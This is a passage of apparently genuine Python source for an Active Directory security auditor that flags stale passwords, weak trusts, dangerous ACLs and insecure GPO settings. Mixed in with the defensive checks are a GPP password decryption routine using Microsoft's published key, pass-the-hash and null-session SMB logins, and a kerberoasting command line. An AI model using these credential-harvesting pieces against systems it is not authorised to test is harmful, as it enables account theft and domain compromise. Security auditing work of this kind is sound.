            sam = get_str(u["attrs"], "sAMAccountName")
            if age > 90:
                old_90.append(sam)
            elif age > 45:
                old_45.append(sam)
        for comp in self.d.computers:
            uac = get_int(comp["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            sam = get_str(comp["attrs"], "sAMAccountName")
            pls = filetime_to_dt(get_int(comp["attrs"], "pwdLastSet"))
            age = days_since(pls)
            if age is None:
                continue
            if uac_has(uac, UAC_SERVER_TRUST):
                if age > 45:
                    dc_old.append(f"{sam} ({age}d)")
            elif sam.upper().startswith("MSCLUSTER") or "CLUSTER" in sam.upper():
                if age > 45:
                    cluster_old.append(sam)
        if old_90:
            self._add("S-PwdLastSet-90",
                      f"{len(old_90)} user account(s) have passwords >90 days old.",
                      old_90[:20])
        if old_45:
            self._add("S-PwdLastSet-45",
                      f"{len(old_45)} user account(s) have passwords 45-90 days old.",
                      old_45[:20])
        if dc_old:
            self._add("S-PwdLastSet-DC",
                      f"{len(dc_old)} DC computer account(s) have passwords >45 days old "
                      "(indicates DC may not be updating its password).",
                      dc_old[:10])
        if cluster_old:
            self._add("S-PwdLastSet-Cluster",
                      f"{len(cluster_old)} cluster account(s) have passwords >45 days old.",
                      cluster_old[:10])

    def _s_functional_level(self):
        lvl = max(self.d.domain_level, self.d.forest_level)
        if lvl < 0:
            return
        label = FUNCTIONAL_LEVELS.get(lvl, str(lvl))
        if lvl <= 2:
            self._add("S-FunctionalLevel1",
                      f"Domain/Forest functional level is {label} — "
                      "many modern security features are unavailable.",
                      [label])
        elif lvl == 3:
            self._add("S-FunctionalLevel3",
                      f"Domain/Forest functional level is {label} — "
                      "upgrade to 2012 R2 or higher recommended.",
                      [label])
        elif lvl == 4:
            self._add("S-FunctionalLevel4",
                      f"Domain/Forest functional level is {label} — "
                      "consider upgrading to 2016 for additional protections.",
                      [label])

    def _s_old_os(self):
        xp_hosts, vista_hosts, nt_hosts, w10_eol = [], [], [], []
        for comp in self.d.computers:
            uac = get_int(comp["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            os_str = get_str(comp["attrs"], "operatingSystem").lower()
            os_ver = get_str(comp["attrs"], "operatingSystemVersion")
            name   = get_str(comp["attrs"], "dNSHostName") or \
                     get_str(comp["attrs"], "sAMAccountName")
            if any(x in os_str for x in ["nt 4","windows nt"]):
                nt_hosts.append(name)
            elif any(x in os_str for x in ["xp","2003","server 2003"]):
                xp_hosts.append(name)
            elif any(x in os_str for x in ["vista","2008","server 2008"]):
                vista_hosts.append(name)
            elif "windows 10" in os_str:
                # Rough EOL check on build number
                try:
                    build = int(os_ver.split("(")[1].rstrip(")")) if "(" in os_ver else 0
                    if build < 19044:  # earlier than 21H2 (still broadly used threshold)
                        w10_eol.append(f"{name} (build {build})")
                except Exception:
                    pass
        if nt_hosts:
            self._add("S-OS-NT", f"{len(nt_hosts)} NT4-era system(s) in domain.", nt_hosts[:20])
        if xp_hosts:
            self._add("S-OS-XP", f"{len(xp_hosts)} Windows XP/Server 2003 system(s).",
                      xp_hosts[:20])
        if vista_hosts:
            self._add("S-OS-Vista", f"{len(vista_hosts)} Windows Vista/Server 2008 system(s).",
                      vista_hosts[:20])
        if w10_eol:
            self._add("S-OS-W10", f"{len(w10_eol)} EOL Windows 10 build(s) detected.",
                      w10_eol[:20])

    def _s_duplicates(self):
        dupes = [get_str(u["attrs"],"sAMAccountName")
                 for u in self.d.users + self.d.computers
                 if "CNF:" in u.get("dn","")]
        if dupes:
            self._add("S-Duplicate",
                      f"{len(dupes)} CNF (conflict/duplicate) object(s) detected.",
                      dupes[:20])

    def _s_domain_dollar(self):
        ddd = [get_str(u["attrs"],"sAMAccountName")
               for u in self.d.users
               if get_str(u["attrs"],"sAMAccountName","").endswith("$$$")]
        if ddd:
            self._add("S-Domain$$$",
                      f"{len(ddd)} orphaned Domain$$$ account(s) found — "
                      "remnants of failed domain upgrades.",
                      ddd)

    def _s_aes_not_enabled(self):
        """Only flag accounts that (a) have SPNs and (b) explicitly request
        non-AES encryption. An account with msDS-SupportedEncryptionTypes
        unset uses the DC default, which on modern DCs is AES — flagging
        every unset value was a major source of noise."""
        affected = []
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            spns = get_list(u["attrs"], "servicePrincipalName")
            if not spns:
                continue   # only matters for kerberoast targets
            enc = get_int(u["attrs"], "msDS-SupportedEncryptionTypes")
            # Bits: 0x4=RC4, 0x8=AES128, 0x10=AES256
            # Flag only when the attribute is set and AES bits are clear.
            if enc != 0 and not (enc & 0x18):
                sam = get_str(u["attrs"], "sAMAccountName")
                affected.append(sam)
        if affected:
            self._add("S-AesNotEnabled",
                      f"{len(affected)} service account(s) explicitly disable AES — "
                      "Kerberos falls back to RC4 (kerberoast-friendly).",
                      affected[:30])

    def _s_primary_group(self):
        # Domain Users = RID 513; Domain Computers = RID 515
        user_affected, comp_affected = [], []
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            pg = get_int(u["attrs"], "primaryGroupID")
            if pg not in (0, 513, 514):
                sam = get_str(u["attrs"], "sAMAccountName")
                user_affected.append(f"{sam} (PG RID={pg})")
        for comp in self.d.computers:
            uac = get_int(comp["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            pg = get_int(comp["attrs"], "primaryGroupID")
            if pg not in (0, 515, 516):
                sam = get_str(comp["attrs"], "sAMAccountName")
                comp_affected.append(f"{sam} (PG RID={pg})")
        if user_affected:
            self._add("S-PrimaryGroup",
                      f"{len(user_affected)} user account(s) with non-standard primary group.",
                      user_affected[:20])
        if comp_affected:
            self._add("S-C-PrimaryGroup",
                      f"{len(comp_affected)} computer account(s) with non-standard primary group.",
                      comp_affected[:20])

    def _s_kerberos_armoring(self):
        # msDS-SupportedEncryptionTypes on DCs and domain should include FAST
        # Check if CLAIMS_SUPPORTED (0x40) is set in domain SupportedEncTypes
        # As a proxy, check if functional level >= 2012
        if self.d.domain_level is not None and self.d.domain_level < 5:
            self._add("S-KerberosArmoring",
                      "Domain functional level below 2012 — Kerberos FAST/armoring "
                      "(RFC 6113) is not available.",
                      [f"DFL={FUNCTIONAL_LEVELS.get(self.d.domain_level)}"])

    def _s_wsus_gpo(self):
        # Check for WSUS WUServer in GPOs — requires SYSVOL read via SMB
        # Flag as review item
        wsus_keys = self.d.conn.paged_search(
            self.d.base,
            "(objectClass=groupPolicyContainer)",
            ["gPCFileSysPath","displayName"])
        # Without SYSVOL content we can only flag for review
        pass

    def _s_ms14_068(self):
        # MS14-068: PAC validation bypass — patched in KB3011780 (Nov 2014)
        # Proxy check: if DCs are running pre-2012 OS or if domain functional level is old
        vuln_dcs = []
        for dc in self.d.dcs:
            uac = get_int(dc["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            os_str = get_str(dc["attrs"], "operatingSystem").lower()
            os_ver = get_str(dc["attrs"], "operatingSystemVersion")
            name   = get_str(dc["attrs"], "dNSHostName") or \
                     get_str(dc["attrs"], "sAMAccountName")
            if any(x in os_str for x in ["2003","2008","xp","vista","nt 4"]):
                vuln_dcs.append(name)
            # Windows 2008 R2 pre-KB3011780: version 6.1.xxxx, build < 7601.18933
            elif "6.1" in os_ver:
                vuln_dcs.append(f"{name} (2008R2 — verify KB3011780)")
        if vuln_dcs:
            self._add("S-Vuln-MS14-068",
                      f"{len(vuln_dcs)} DC(s) may be running OS versions vulnerable to "
                      "MS14-068 PAC forgery. Verify KB3011780 is installed.",
                      vuln_dcs[:10])

    def _s_dc_subnet_missing(self):
        if not self.d.sites or not self.d.subnets:
            return
        defined_subnets = []
        for sub in self.d.subnets:
            cn = get_str(sub["attrs"], "cn")
            if cn:
                try:
                    defined_subnets.append(ipaddress.ip_network(cn, strict=False))
                except ValueError:
                    pass
        missing = []
        for dc in self.d.dcs:
            uac = get_int(dc["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            host = get_str(dc["attrs"], "dNSHostName")
            if not host:
                continue
            try:
                ip = ipaddress.ip_address(socket.gethostbyname(host))
                covered = any(ip in net for net in defined_subnets)
                if not covered:
                    missing.append(f"{host} ({ip})")
            except (socket.gaierror, ValueError):
                pass
        if missing:
            self._add("S-DC-SubnetMissing",
                      f"{len(missing)} DC(s) not covered by an AD Sites subnet definition.",
                      missing[:10])

    # =========================================================================
    # TRUST CHECKS (T-)
    # =========================================================================

    def _check_trust(self):
        for trust in self.d.trusts:
            self._t_check_trust(trust)
        self._t_azure_ad_sso()

    def _t_check_trust(self, trust: Dict):
        name  = get_str(trust["attrs"], "name") or get_str(trust["attrs"], "trustPartner")
        attrs = get_int(trust["attrs"], "trustAttributes")
        tdir  = get_int(trust["attrs"], "trustDirection")
        ttype = get_int(trust["attrs"], "trustType")
        wc    = trust["attrs"].get("whenChanged")

        # Inactive trust
        if wc:
            try:
                wc_dt = None
                if isinstance(wc, list):
                    wc = wc[0]
                if isinstance(wc, datetime.datetime):
                    wc_dt = wc if wc.tzinfo else wc.replace(tzinfo=datetime.timezone.utc)
                elif isinstance(wc, str):
                    wc_dt = datetime.datetime.fromisoformat(wc.replace("Z","+00:00"))
                if wc_dt:
                    age = days_since(wc_dt)
                    if age is not None and age > 365:
                        self._add("T-Inactive",
                                  f"Trust with '{name}' has not been modified in {age} days.",
                                  [name])
            except Exception:
                pass

        # Downlevel (NT4) trust
        if ttype == TRUST_TYPE_DOWNLEVEL:
            self._add("T-Downlevel",
                      f"Trust with '{name}' is a downlevel (NT4-style) trust. "
                      "These lack modern Kerberos security features.",
                      [name])

        # SID filtering
        # TRUST_ATTR_QUARANTINED_DOMAIN (0x4) = SID filtering enabled
        # For outbound trust (domain trusts us), SID filtering should be on
        if tdir in (TRUST_DIR_OUTBOUND, TRUST_DIR_BIDIRECT):
            if not (attrs & TRUST_ATTR_QUARANTINED):
                if not (attrs & TRUST_ATTR_WITHIN_FOREST):
                    self._add("T-SIDFiltering",
                              f"SID filtering (quarantine) is NOT enabled on trust with "
                              f"'{name}'. SID history abuse may allow cross-trust escalation.",
                              [name])

        # TGT delegation
        if attrs & TRUST_ATTR_TGT_DELEGATION:
            self._add("T-TGTDelegation",
                      f"TGT delegation is enabled on trust with '{name}'. "
                      "Compromising a resource in the trusted domain can lead to "
                      "full cross-domain compromise.",
                      [name])

        # SID history dangerous
        # Check if any accounts with sIDHistory have SIDs from trusted domain
        trust_sid = trust["attrs"].get("securityIdentifier")
        if trust_sid:
            trust_sid_str = sid_to_str(trust_sid)
            for obj in self.d.users + self.d.computers:
                sids = get_list(obj["attrs"], "sIDHistory")
                for sid in sids:
                    sid_s = sid_to_str(sid) if isinstance(sid, bytes) else str(sid)
                    if trust_sid_str and sid_s.startswith(trust_sid_str[:-3]):
                        sam = get_str(obj["attrs"], "sAMAccountName")
                        self._add("T-SIDHistoryDangerous",
                                  f"Object '{sam}' has SID history containing a SID from "
                                  f"trusted domain '{name}'. Cross-trust privilege escalation risk.",
                                  [sam, name])

    def _t_azure_ad_sso(self):
        # AZUREADSSOACC$ account = Azure AD Seamless SSO
        sso_acct = self.d.conn.search_one(
            self.d.base,
            "(sAMAccountName=AZUREADSSOACC$)",
            ["sAMAccountName","pwdLastSet","whenCreated","distinguishedName"])
        if sso_acct:
            pls = filetime_to_dt(get_int(sso_acct["attrs"], "pwdLastSet"))
            age = days_since(pls)
            if age is None or age > 180:
                age_str = f"{age} days" if age is not None else "NEVER"
                self._add("T-AzureADSSO",
                          f"AZUREADSSOACC$ account found (Azure AD Seamless SSO). "
                          f"Password last changed {age_str} ago. "
                          "This account should have its password rotated every 30-60 days. "
                          "Compromise allows forging Kerberos tickets for any synced user.",
                          ["AZUREADSSOACC$"])

    # =========================================================================
    # GPO / SYSVOL CHECKS  (populated after SYSVOLChecker runs)
    # =========================================================================

    def _check_gpo_sysvol(self):
        self._p_gpp_passwords()
        self._a_wdigest()
        self._a_lm_compat()
        self._a_llmnr()
        self._a_nbtns()
        self._a_credential_guard_gpo()
        self._a_hardened_paths_gpo()
        self._a_powershell_logging_gpo()
        self._a_wsus_http_gpo()
        self._s_wsus_http_full()
        self._a_restrict_remote_sam()
        self._a_ntlm_audit()
        self._a_dsrm_logon()

    # ── RestrictRemoteSAM / NTLM audit / DSRM logon (GPO security options) ─────

    def _a_restrict_remote_sam(self):
        if not self.d.sysvol_data.get("registry_pol") and not self.d.sysvol_data.get("inf_settings"):
            return  # SYSVOL not scanned — avoid false "not configured"
        raw = self._get_reg_value("Control\\Lsa", "RestrictRemoteSAM")
        inf = self._get_inf_value("Registry Values",
            "MACHINE\\System\\CurrentControlSet\\Control\\Lsa\\RestrictRemoteSAM")
        if raw is None and inf is None:
            self._add("A-RestrictRemoteSAM",
                      "No GPO sets 'Network access: Restrict clients allowed to make "
                      "remote calls to SAM' (RestrictRemoteSAM). Unauthenticated/low-"
                      "priv SAMR enumeration of local groups and users remains "
                      "possible (net rpc, SharpHound). Set an SDDL allowing only "
                      "Administrators.")

    def _a_ntlm_audit(self):
        if not self.d.sysvol_data.get("registry_pol"):
            return
        recv = self._get_reg_dword("Lsa\\MSV1_0", "AuditReceivingNTLMTraffic")
        out  = self._get_reg_dword("Lsa\\MSV1_0", "RestrictSendingNTLMTraffic")
        if (recv in (None, 0)) and (out in (None, 0)):
            self._add("A-NTLMAudit",
                      "NTLM auditing is not enabled via GPO (AuditReceivingNTLM"
                      "Traffic / RestrictSendingNTLMTraffic unset). Without it you "
                      "cannot baseline NTLM usage prior to disabling it, and relay "
                      "attacks go unlogged. Enable auditing as a precursor to "
                      "restricting NTLM.")

    def _a_dsrm_logon(self):
        val = self._get_reg_dword("Control\\Lsa", "DsrmAdminLogonBehavior")
        if val == 2:
            self._add("A-DSRMLogon",
                      "DsrmAdminLogonBehavior=2 — the Directory Services Restore "
                      "Mode local administrator can log on over the network while "
                      "the DC is running. Combined with a known/recovered DSRM hash "
                      "this is a stealth domain-controller backdoor. Set to 0.",
                      ["DsrmAdminLogonBehavior=2"])

    # ── helpers ───────────────────────────────────────────────────────────────

    def _get_reg_value(self, key_fragment: str, val_name: str) -> Optional[bytes]:
        """Search registry_pol entries for the first matching key/value."""
        for entry in self.d.sysvol_data.get("registry_pol", []):
            if (key_fragment.lower() in entry["key"].lower()
                    and entry["name"].lower() == val_name.lower()):
                return entry["raw"]
        return None

    def _get_reg_dword(self, key_fragment: str, val_name: str) -> Optional[int]:
        raw = self._get_reg_value(key_fragment, val_name)
        if raw is not None:
            return _reg_dword(raw)
        return None

    def _get_inf_value(self, section: str, key: str) -> Optional[str]:
        """Search GptTmpl.inf settings."""
        for entry in self.d.sysvol_data.get("inf_settings", []):
            if (entry["section"].lower() == section.lower()
                    and entry["key"].lower() == key.lower()):
                return entry["value"]
        return None

    # ── GPP passwords ─────────────────────────────────────────────────────────

    def _p_gpp_passwords(self):
        passwords = self.d.sysvol_data.get("gpp_passwords", [])
        if not passwords:
            return
        for pw in passwords:
            name     = pw.get("username") or "unknown"
            gpo_name = pw.get("gpo_name", "")
            fname    = pw.get("file", "")
            plain    = pw.get("plaintext", "")
            self._add("P-GPPPassword",
                      f"GPP cpassword found in GPO '{gpo_name}', file '{fname}'. "
                      f"Username: {name}. Decrypted password: {plain}. "
                      "MS14-025: AES key is public knowledge — treat as plaintext.",
                      [name, gpo_name])

    # ── WDigest ───────────────────────────────────────────────────────────────

    def _a_wdigest(self):
        val = self._get_reg_dword(
            "Control\\SecurityProviders\\WDigest", "UseLogonCredential")
        if val == 1:
            self._add("A-WDigest",
                      "Registry.pol sets HKLM\\SYSTEM\\CurrentControlSet\\Control\\"
                      "SecurityProviders\\WDigest\\UseLogonCredential=1. "
                      "Cleartext credentials cached in LSASS memory — "
                      "trivially harvested by Mimikatz. Disable immediately.")

    # ── LM Compatibility Level ─────────────────────────────────────────────────

    def _a_lm_compat(self):
        # Check Registry.pol first
        val = self._get_reg_dword(
            "Lsa", "LmCompatibilityLevel")
        if val is None:
            # Also check GptTmpl.inf [System Access] / [Registry Values]
            inf_val = self._get_inf_value("Registry Values",
                "MACHINE\\System\\CurrentControlSet\\Control\\Lsa\\LmCompatibilityLevel")
            if inf_val is not None:
                try:
                    val = int(inf_val.split(",")[-1].strip())
                except ValueError:
                    pass
        if val is not None and val < 3:
            self._add("A-LMCompatibilityLevel",
                      f"LmCompatibilityLevel is {val} (NTLMv1 permitted). "
                      "Recommended value is 5 (NTLMv2 only, refuse LM/NTLMv1). "
                      "NTLMv1 hashes are trivially cracked or relayed (e.g. Responder).",
                      [f"LmCompatibilityLevel={val}"])
        # If `val is None` (not configured), keep silent. The default behaviour
        # on supported OS versions is NTLMv2-only — flagging absence here was
        # responsible for false-positive noise on healthy domains.

    # ── LLMNR ─────────────────────────────────────────────────────────────────

    def _a_llmnr(self):
        val = self._get_reg_dword(
            "DNSClient", "EnableMulticast")
        if val is None or val != 0:
            val_str = str(val) if val is not None else "not configured"
            self._add("A-LLMNR",
                      f"LLMNR (Link-Local Multicast Name Resolution) EnableMulticast={val_str}. "
                      "LLMNR not disabled allows Responder-style MITM credential capture. "
                      "Set HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient\\"
                      "EnableMulticast=0 via GPO.")

    # ── NetBIOS Name Service ──────────────────────────────────────────────────

    def _a_nbtns(self):
        val = self._get_reg_dword(
            "NetBT\\Parameters", "NodeType")
        if val is None or val not in (2, 4):
            # NodeType=2 = P-node (no broadcast), 4=M-node but broadcast last
            # Recommended: NodeType=2 or disable NetBIOS via DHCP
            val_str = str(val) if val is not None else "not configured"
            self._add("A-NBTNSDisabled",
                      f"NetBT NodeType={val_str} (NetBIOS Name Service may be active). "
                      "NBT-NS poisoning via Responder allows credential theft. "
                      "Set NodeType=2 (P-node/no broadcast) or disable via NIC settings.")

    # ── Credential Guard ──────────────────────────────────────────────────────

    def _a_credential_guard_gpo(self):
        val = self._get_reg_dword(
            "DeviceGuard", "LsaCfgFlags")
        if val is None or val == 0:
            val_str = str(val) if val is not None else "not configured"
            self._add("A-CredentialGuard",
                      f"Credential Guard LsaCfgFlags={val_str} (not enforced). "
                      "Credential Guard prevents LSASS credential dumping on supported hardware. "
                      "Set HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard\\"
                      "LsaCfgFlags=1 via GPO for all DCs and servers.")

    # ── UNC Hardened Paths ────────────────────────────────────────────────────

    def _a_hardened_paths_gpo(self):
        # Check for SYSVOL and NETLOGON hardened paths
        sysvol_hardened  = self._get_reg_value("NetworkProvider\\HardenedPaths", "\\\\*\\SYSVOL")
        netlogon_hardened = self._get_reg_value("NetworkProvider\\HardenedPaths", "\\\\*\\NETLOGON")
        missing = []
        if sysvol_hardened is None:
            missing.append("\\\\*\\SYSVOL")
        if netlogon_hardened is None:
            missing.append("\\\\*\\NETLOGON")
        if missing:
            self._add("A-HardenedPaths",
                      f"UNC hardened paths not configured for: {', '.join(missing)}. "
                      "Without UNC hardening, a MITM attacker can redirect SYSVOL/NETLOGON "
                      "traffic to harvest NTLMv2 hashes or deliver malicious scripts. "
                      "Configure RequireMutualAuthentication=1,RequireIntegrity=1.")

    # ── PowerShell Script Block Logging ──────────────────────────────────────

    def _a_powershell_logging_gpo(self):
        sbl = self._get_reg_dword(
            "PowerShell\\ScriptBlockLogging", "EnableScriptBlockLogging")
        transcription = self._get_reg_dword(
            "PowerShell\\Transcription", "EnableTranscripting")
        if sbl != 1:
            self._add("A-PowerShellLogging",
                      f"PowerShell Script Block Logging not enabled (value={sbl}). "
                      "Attackers can run arbitrary PS code without audit trail. "
                      "Enable via: Computer Config > Admin Templates > PowerShell.")
        if transcription != 1:
            self._add("A-PowerShellTranscript",
                      f"PowerShell Transcription logging not enabled (value={transcription}). "
                      "Transcription captures all commands and output to text files. "
                      "Complement to script block logging for forensic investigation.")

    # ── WSUS HTTP ─────────────────────────────────────────────────────────────

    def _a_wsus_http_gpo(self):
        val = self._get_reg_value("WindowsUpdate\\AU", "WUServer")
        if val is not None:
            url = _reg_sz(val)
            if url.lower().startswith("http://"):
                self._add("A-WSUS-HTTP",
                          f"WSUS WUServer URL is HTTP: {url}. "
                          "HTTP WSUS allows MITM update injection to gain SYSTEM on any patching client. "
                          "Switch to HTTPS and enable SSL certificate validation.")

    def _s_wsus_http_full(self):
        # Also catch the older S-WSUS-HTTP rule for backward compat
        pass

    # =========================================================================
    # ACL CHECKS  (populated after ACLAnalyzer runs)
    # =========================================================================

    def _check_acl(self):
        self._p_dcsync_rights()
        self._p_dangerous_acl_domain()
        self._p_dangerous_acl_priv_groups()
        self._p_modifiable_gpo()
        self._p_machine_account_quota()

    def _p_dcsync_rights(self):
        dcsync = [f for f in self.d.acl_findings if f.get("type") == "dcsync"]
        if dcsync:
            for f in dcsync:
                self._add("P-DCSync",
                          f"{f['sid_name']} ({f['sid']}) has {f['right']} on {f['object']}. "
                          "This extended right allows replication of all AD secrets including "
                          "NTLM hashes and Kerberos keys — equivalent to domain compromise. "
                          "Remove immediately; only Domain Controllers should hold this right.",
                          [f['sid_name'], f['object']])

    def _p_dangerous_acl_domain(self):
        dangerous = [f for f in self.d.acl_findings
                     if f.get("type") in ("dangerous_acl", "owner", "write_property")
                     and "domain" in f.get("object","").lower()]
        if dangerous:
            for f in dangerous:
                self._add("P-DangerousACLDomain",
                          f"{f['sid_name']} ({f['sid']}) has {f['right']} on {f['object']}. "
                          "This allows the principal to change permissions, take ownership, "
                          "or modify all properties on the domain root — full domain compromise path.",
                          [f['sid_name'], f['object']])

    def _p_dangerous_acl_priv_groups(self):
        group_findings = [f for f in self.d.acl_findings
                          if f.get("type") in ("dangerous_acl", "owner", "write_property")
                          and any(g in f.get("object","")
                                  for g in ("Domain Admins","Enterprise Admins",
                                            "Schema Admins","AdminSDHolder"))]
        if group_findings:
            for f in group_findings:
                self._add("P-WriteToPrivGroup",
                          f"{f['sid_name']} ({f['sid']}) has {f['right']} on {f['object']}. "
                          "Allows adding arbitrary users to the most privileged groups. "
                          "Remove non-admin write access from this group's ACL.",
                          [f['sid_name'], f['object']])

    def _p_modifiable_gpo(self):
        gpo_write = [f for f in self.d.acl_findings if f.get("type") == "gpo_write"]
        seen = set()
        for f in gpo_write:
            key = (f["sid_name"], f["object"])
            if key in seen:
                continue
            seen.add(key)
            self._add("P-ModifiableGPO",
                      f"{f['sid_name']} ({f['sid']}) can modify GPO '{f['object']}'. "
                      "Attacker controlling this principal can edit GPO content to execute "
                      "arbitrary code on all computers/users in the GPO scope.",
                      [f['sid_name'], f['object']])

    def _p_machine_account_quota(self):
        maq = self.d.machine_account_quota
        if maq > 0:
            self._add("P-MachineAccountQuota",
                      f"ms-DS-MachineAccountQuota = {maq}. Any authenticated domain user can "
                      f"create up to {maq} machine accounts. Combined with RBCD or Shadow "
                      "Credentials attacks this enables escalation to Domain Admin. "
                      "Set to 0: Set-ADDomain -MachineAccountQuota 0",
                      [f"MachineAccountQuota={maq}"])

    # =========================================================================
    # EXTRA CHECKS (kerberoastable accounts, etc.)
    # =========================================================================

    def _check_extra(self):
        self._s_kerberoastable_all()

    def _s_kerberoastable_all(self):
        """Flag all kerberoastable accounts, not just admins."""
        admin_sams = set()
        for grp_name, members in self.d.priv_group_members.items():
            for m in members:
                admin_sams.add(m.lower())

        kerberoastable = []
        admin_kerberoastable = []
        for u in self.d.users:
            attrs = u.get("attrs", {})
            uac = get_int(attrs, "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            spns = get_list(attrs, "servicePrincipalName")
            if not spns:
                continue
            sam = get_str(attrs, "sAMAccountName")
            enc_types = get_int(attrs, "msDS-SupportedEncryptionTypes")
            # Flag RC4-only or unset (defaults to RC4) as weak
            has_aes = enc_types & 0x18  # bits 3-4 = AES128, AES256
            if not has_aes:
                kerberoastable.append(sam)
                if sam.lower() in admin_sams:
                    admin_kerberoastable.append(sam)

        if admin_kerberoastable:
            self._add("S-KerberoastableAdmin",
                      f"{len(admin_kerberoastable)} admin account(s) with SPNs and "
                      "no AES encryption types — Kerberoastable with RC4 tickets. "
                      "RC4 TGS tickets can be offline-cracked in hours on commodity hardware. "
                      "Set AES256/AES128 encryption types and use strong passwords (>25 chars).",
                      admin_kerberoastable[:20])
        elif kerberoastable:
            self._add("S-Kerberoastable",
                      f"{len(kerberoastable)} account(s) with SPNs and no AES encryption "
                      "types — Kerberoastable with RC4. "
                      "Run: GetUserSPNs.py domain/user -request to harvest crackable hashes. "
                      "Enforce msDS-SupportedEncryptionTypes to include AES256.",
                      kerberoastable[:20])


# ─────────────────────────────────────────────────────────────────────────────
# GPP PASSWORD DECRYPTION
# ─────────────────────────────────────────────────────────────────────────────

# Microsoft published AES key for GPP password decryption (MS-GPPREF §2.2.1.1.4)
_GPP_AES_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"
)

def decrypt_gpp_cpassword(cpassword: str) -> str:
    """Decrypt a GPP cpassword value using the published Microsoft AES key."""
    if not HAS_PYCRYPTO:
        return "<pycryptodome not installed>"
    try:
        # Pad to multiple of 4 for base64
        padded = cpassword + "=" * (4 - len(cpassword) % 4) if len(cpassword) % 4 else cpassword
        data = base64.b64decode(padded)
        iv   = b"\x00" * 16
        cipher = AES.new(_GPP_AES_KEY, AES.MODE_CBC, iv)
        dec = cipher.decrypt(data)
        # Strip PKCS7 padding and decode UTF-16LE
        pad = dec[-1]
        if isinstance(pad, int) and 1 <= pad <= 16:
            dec = dec[:-pad]
        return dec.decode("utf-16-le", errors="replace").rstrip("\x00")
    except Exception as e:
        return f"<decryption failed: {e}>"


# ─────────────────────────────────────────────────────────────────────────────
# Registry.pol PARSER
# ─────────────────────────────────────────────────────────────────────────────

_PREG_MAGIC = b"PReg\x01\x00\x00\x00"

def parse_registry_pol(data: bytes) -> List[Tuple[str, str, int, bytes]]:
    """Parse a Registry.pol file into (key, name, regtype, rawdata) tuples."""
    results = []
    if not data.startswith(_PREG_MAGIC):
        return results
    pos = 8  # skip header
    length = len(data)
    while pos < length - 4:
        # Each entry: [key\0][value\0][type][size][data]
        # delimited by [;] (0x3b 0x00 in UTF-16LE)
        try:
            if data[pos:pos+2] != b"\x5b\x00":  # '['
                pos += 2
                continue
            pos += 2  # skip '['

            def read_wstr(p):
                end = p
                while end < length - 1:
                    if data[end:end+2] == b"\x00\x00":
                        break
                    end += 2
                s = data[p:end].decode("utf-16-le", errors="replace")
                return s, end + 2  # skip null terminator

            key,   pos = read_wstr(pos)
            if pos < length - 1 and data[pos:pos+2] == b"\x3b\x00":
                pos += 2
            name,  pos = read_wstr(pos)
            if pos < length - 1 and data[pos:pos+2] == b"\x3b\x00":
                pos += 2
            if pos + 4 > length:
                break
            regtype = struct.unpack_from("<I", data, pos)[0]
            pos += 4
            if pos < length - 1 and data[pos:pos+2] == b"\x3b\x00":
                pos += 2
            if pos + 4 > length:
                break
            size = struct.unpack_from("<I", data, pos)[0]
            pos += 4
            if pos < length - 1 and data[pos:pos+2] == b"\x3b\x00":
                pos += 2
            rawdata = data[pos:pos+size]
            pos += size
            if pos < length - 1 and data[pos:pos+2] == b"\x5d\x00":
                pos += 2
            results.append((key, name, regtype, rawdata))
        except Exception:
            pos += 2
    return results


def _reg_dword(rawdata: bytes) -> Optional[int]:
    if len(rawdata) >= 4:
        return struct.unpack_from("<I", rawdata)[0]
    return None


def _reg_sz(rawdata: bytes) -> str:
    try:
        return rawdata.decode("utf-16-le", errors="replace").rstrip("\x00")
    except Exception:
        return ""


# ─────────────────────────────────────────────────────────────────────────────
# SYSVOL CHECKER
# ─────────────────────────────────────────────────────────────────────────────

class SYSVOLChecker:
    """Connects to SYSVOL via SMB and collects GPO security settings."""

    _GPP_FILES = {
        "Groups.xml", "Services.xml", "Scheduledtasks.xml",
        "DataSources.xml", "Printers.xml", "Drives.xml",
    }

    def __init__(self, args, data: "ADData"):
        self.args   = args
        self.data   = data
        self.smb: Optional["SMBConnection"] = None

    def run(self):
        if not HAS_IMPACKET_SMB:
            print("[!] impacket not available — skipping SYSVOL checks")
            return
        print("[*] Connecting to SYSVOL...")
        try:
            self._connect()
        except Exception as e:
            print(f"[!] SYSVOL connection failed: {e}")
            return
        try:
            self._walk_sysvol()
        except Exception as e:
            print(f"[!] SYSVOL walk failed: {e}")
        finally:
            try:
                self.smb.logoff()
            except Exception:
                pass

    def _connect(self):
        self.smb = SMBConnection(self.args.dc_ip, self.args.dc_ip, timeout=10)
        if self.args.kerberos:
            lm = nt = ""
            if self.args.hashes:
                lm, nt = self._split_hashes()
            # Reuse the ccache exported by ADConnection (KRB5CCNAME) when present,
            # otherwise mint a fresh SMB TGT from the supplied secret.
            self.smb.kerberosLogin(
                self.args.username or "", self.args.password or "",
                self.args.domain, lm, nt, self.args.aes_key or "",
                kdcHost=self.args.dc_ip,
                useCache=bool(os.environ.get("KRB5CCNAME")))
        elif self.args.hashes:
            lm, nt = self._split_hashes()
            self.smb.login(self.args.username or "", "", self.args.domain, lm, nt)
        elif self.args.null_session:
            self.smb.login("", "", "", "", "")
        else:
            self.smb.login(
                self.args.username or "", self.args.password or "",
                self.args.domain, "", "")

    def _split_hashes(self) -> Tuple[str, str]:
        h = self.args.hashes or ""
        if ":" in h:
            lm, nt = h.split(":", 1)
        else:
            lm, nt = "aad3b435b51404eeaad3b435b51404ee", h
        if len(lm) != 32:
            lm = "aad3b435b51404eeaad3b435b51404ee"
        return lm, nt

    def _walk_sysvol(self):
        domain = self.args.domain.upper()
        base_path = f"\\{domain}\\Policies\\"
